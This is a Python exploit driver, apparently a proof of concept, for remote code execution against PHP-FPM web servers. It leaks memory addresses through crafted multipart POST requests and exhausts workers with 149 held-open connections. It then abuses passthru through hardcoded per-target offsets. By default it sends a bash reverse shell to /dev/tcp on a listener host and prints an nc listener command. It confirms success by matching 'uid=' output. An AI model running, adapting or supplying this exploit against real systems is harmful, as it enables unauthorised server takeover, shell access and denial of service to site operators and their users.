#!/usr/bin/env python3

import argparse
import hashlib
import importlib.util
import json
import re
import socket
import time
from pathlib import Path
from urllib.parse import urlsplit


HERE = Path(__file__).resolve().parent


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


LEAK = load("native_output_leak", HERE / "native-output-leak.py")

# STOCK/COMPACT ship as separate author-provided files next to this driver.
STOCK = None
COMPACT = None


def load_helpers() -> None:
    global STOCK, COMPACT
    missing = [
        name
        for name in (
            "native-output-leak-stock-arm.py",
            "compact-stock-tail.py",
        )
        if not (HERE / name).exists()
    ]
    if missing:
        raise FileNotFoundError(
            "missing helper module(s) next to php2shell.py: " + ", ".join(missing)
        )
    STOCK = load("native_output_stock_arm", HERE / "native-output-leak-stock-arm.py")
    COMPACT = load("compact_stock_tail", HERE / "compact-stock-tail.py")


PROFILES = {
    "ubuntu85-1.3-compact": {
        "name": "ubuntu85-1.3-compact",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x1800000, 0x1A00000),
        "zif_passthru_offset": 0x3DDAA0,
        "zend_llist_remove_tail_offset": 0x5C9470,
        "blockers": 149,
    },
    # measured live on the operator-owned PIE fpm (2026-10-21):
    # workers are forks of one master (shared layout); php_base constant
    # 0x55ffad000000, stable main chunk 0x7f8875a00000 -> delta below.
    "realapps-pie": {
        "name": "realapps-pie",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x296DA4A00000,),
        "zif_passthru_offset": 0x6496C2,
        "zend_llist_remove_tail_offset": 0x84C1AB,
        "blockers": 149,
    },
}
PROFILE = dict(PROFILES["ubuntu85-1.3-compact"])

ID_LINE = re.compile(
    rb"(?m)^uid=[0-9]+\([A-Za-z0-9_.-]+\) "
    rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
)


def parse_url(value: str) -> tuple[str, int, str, str]:
    parsed = urlsplit(value)
    if parsed.scheme != "http" or parsed.username or parsed.password or parsed.fragment:
        raise ValueError("URL must be an uncredentialed HTTP URL without a fragment")
    if not parsed.hostname:
        raise ValueError("URL has no host")
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    path.encode("ascii")
    host_header = parsed.hostname if port == 80 else f"{parsed.hostname}:{port}"
    return parsed.hostname, port, path, host_header


def multipart_request(
    host_header: str,
    path: str,
    sid: bytes,
    boundary: bytes,
    body: bytes,
    keep_alive: bool,
) -> bytes:
    return (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + b"Cookie: PHPSESSID=" + sid + b"\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n"
        + body
    )


def open_exchange(host: str, port: int, request: bytes, timeout: float):
    connection = socket.create_connection((host, port), timeout=timeout)
    connection.settimeout(timeout)
    stream = connection.makefile("rb", buffering=0)
    connection.sendall(request)
    return connection, stream, LEAK.read_response(stream)


def exchange(host: str, port: int, request: bytes, timeout: float):
    connection = None
    try:
        connection, stream, result = open_exchange(host, port, request, timeout)
        return result, None
    except (ConnectionError, OSError, TimeoutError, ValueError) as error:
        return (b"", b"", {}, 0), f"{type(error).__name__}: {error}"
    finally:
        if connection is not None:
            connection.close()


def record(output: Path, label: str, request: bytes, result, error: str | None = None) -> dict:
    response, body, headers, status = result
    artifacts = {
        f"{label}-request.bin": request,
        f"{label}-response.bin": response,
        f"{label}-body.bin": body,
    }
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
    item = {
        "status": status,
        "connection": headers.get("connection", ""),
        "body_bytes": len(body),
        "sha256": {name: hashlib.sha256(data).hexdigest() for name, data in artifacts.items()},
    }
    if error:
        item["error"] = error
    return item


def derive(body: bytes, submitted: list[bytes]) -> dict:
    disclosure = LEAK.analyze(body, submitted)
    if len(body) != 14 or not disclosure.get("candidate"):
        raise ValueError("response is not the exact 14-byte frozen-profile disclosure")
    main = int(disclosure["main_chunk"], 16)
    target = main + PROFILE["target_offset"]
    stage = main + PROFILE["stage_offset"]
    candidates = [main - delta for delta in PROFILE["dso_deltas"]]
    return {
        "disclosure": disclosure,
        "main": f"0x{main:x}",
        "target": f"0x{target:x}",
        "stage": f"0x{stage:x}",
        "stage_delta": f"0x{stage - target:x}",
        "dso_candidates": [f"0x{candidate:x}" for candidate in candidates],
    }


def build_revshell(lhost: str, lport: int) -> str:
    try:
        addresses = {item[4][0] for item in socket.getaddrinfo(lhost, None)}
    except OSError:
        addresses = set()
    host = next(iter(addresses), lhost)
    # runs inside passthru() -> /bin/sh -c; exec keeps a single interactive bash
    return f"bash -c 'exec bash -i &>/dev/tcp/{host}/{lport}'"


def command_mode(command: str, lhost: str, lport: int) -> str:
    if command == "revshell":
        command = build_revshell(lhost, lport)
    return f"passthru-{command}"


def attempt(
    host: str,
    port: int,
    path: str,
    host_header: str,
    timeout: float,
    ordinal: int,
    output: Path,
    payload: str,
) -> dict:
    output.mkdir(parents=True, exist_ok=True)
    native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    native_arm_request = LEAK.request_bytes(
        host_header, path, native_arm_body, None, 23, False
    )
    native_arm_result, native_arm_error = exchange(
        host, port, native_arm_request, timeout
    )

    probe_body = LEAK.probe_body()
    probe_request = LEAK.request_bytes(host_header, path, probe_body, b"", 64, True)
    positive = None
    try:
        positive, positive_stream, probe_result = open_exchange(
            host, port, probe_request, timeout
        )
        address = derive(probe_result[1], [native_arm_request, probe_request])
        main = int(address["main"], 16)
        target = int(address["target"], 16)
        stage_delta = int(address["stage_delta"], 16)
        dso_base = main - PROFILE["dso_deltas"][ordinal]

        rearm_body = COMPACT.arm_body(False, COMPACT.ARM_FILENAME_LENGTH, 149)
        rearm_request = multipart_request(
            host_header,
            path,
            f"rearm{ordinal}a".encode("ascii"),
            COMPACT.BOUNDARY,
            rearm_body,
            False,
        )
        positive.sendall(rearm_request)
        rearm_result = LEAK.read_response(positive_stream)
    finally:
        if positive is not None:
            positive.close()

    final_body = COMPACT.probe_body(
        100,
        39,
        39,
        11,
        True,
        2,
        8000,
        6000,
        False,
        True,
        target,
        dso_base,
        stage_delta,
        1,
        payload,
    )
    final_request = multipart_request(
        host_header,
        path,
        f"rearm{ordinal}b".encode("ascii"),
        COMPACT.BOUNDARY,
        final_body,
        False,
    )
    final_result, final_error = exchange(host, port, final_request, timeout)
    match = ID_LINE.search(final_result[1])

    records = {
        "native_arm": record(
            output, "native-arm", native_arm_request, native_arm_result, native_arm_error
        ),
        "probe": record(output, "probe", probe_request, probe_result),
        "rearm": record(output, "rearm", rearm_request, rearm_result),
        "final": record(output, "final", final_request, final_result, final_error),
    }
    result = {
        "ordinal": ordinal,
        "dso_delta": f"0x{PROFILE['dso_deltas'][ordinal]:x}",
        "selected_dso": f"0x{dso_base:x}",
        "addresses": address,
        "records": records,
        "id_line": match.group(0).decode("ascii") if match else None,
        "success": bool(match),
        "final_parts": 116,
    }
    rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
    (output / "result.json").write_text(rendered)
    return result


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--profile", required=True, choices=tuple(PROFILES))
    parser.add_argument("--target", "--url", dest="target", required=True)
    parser.add_argument("--command", default="revshell")
    parser.add_argument("--lhost", default="127.0.0.1")
    parser.add_argument("--lport", default=4444, type=int)
    parser.add_argument("--output", required=True, type=Path)
    parser.add_argument("--settle-seconds", default=8.0, type=float)
    parser.add_argument("--recovery-seconds", default=2.0, type=float)
    parser.add_argument("--timeout", default=120.0, type=float)
    args = parser.parse_args()
    if args.profile != PROFILE["name"]:
        PROFILE.clear()
        PROFILE.update(PROFILES[args.profile])

    if not 0 <= args.settle_seconds <= 15:
        parser.error("settle interval must be between 0 and 15 seconds")
    if not 0 <= args.recovery_seconds <= 15:
        parser.error("recovery interval must be between 0 and 15 seconds")
    if not 1 <= args.lport <= 65535:
        parser.error("lport must be between 1 and 65535")

    try:
        host, port, path, host_header = parse_url(args.target)
        payload = command_mode(args.command, args.lhost, args.lport)
    except ValueError as error:
        parser.error(str(error))
    args.output.mkdir(parents=True, exist_ok=True)
    try:
        load_helpers()
    except FileNotFoundError as error:
        parser.error(str(error))
    if args.command == "revshell":
        print(f"[i] payload command: {payload}")
        print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
    hold = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Connection: keep-alive\r\n"
        "X-Hold: "
    ).encode("ascii")

    blockers = []
    attempts = []
    try:
        for _ in range(PROFILE["blockers"]):
            connection = socket.create_connection((host, port), timeout=5)
            connection.settimeout(args.timeout)
            connection.sendall(hold)
            blockers.append(connection)
        time.sleep(args.settle_seconds)

        for ordinal in range(len(PROFILE["dso_deltas"])):
            try:
                result = attempt(
                    host,
                    port,
                    path,
                    host_header,
                    args.timeout,
                    ordinal,
                    args.output / f"candidate-{ordinal}",
                    payload,
                )
            except (ConnectionError, OSError, TimeoutError, ValueError) as error:
                result = {
                    "ordinal": ordinal,
                    "success": False,
                    "error": f"{type(error).__name__}: {error}",
                }
            attempts.append(result)
            if result.get("success"):
                break
            time.sleep(args.recovery_seconds)
    finally:
        for connection in blockers:
            connection.close()

    success = next((item for item in attempts if item.get("success")), None)
    summary = {
        "profile": PROFILE,
        "target": {"url": args.target, "host": host, "port": port, "path": path},
        "command": args.command,
        "lhost": args.lhost,
        "lport": args.lport,
        "payload": payload,
        "blockers_opened": len(blockers),
        "attempts": attempts,
        "success": bool(success),
        "id_line": success.get("id_line") if success else None,
        "successful_candidate": success.get("ordinal") if success else None,
    }
    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
    (args.output / "result.json").write_text(rendered)
    if success:
        print(success["id_line"])
    else:
        print("RCE proof failed")
    return 0 if success else 2


if __name__ == "__main__":
    raise SystemExit(main())
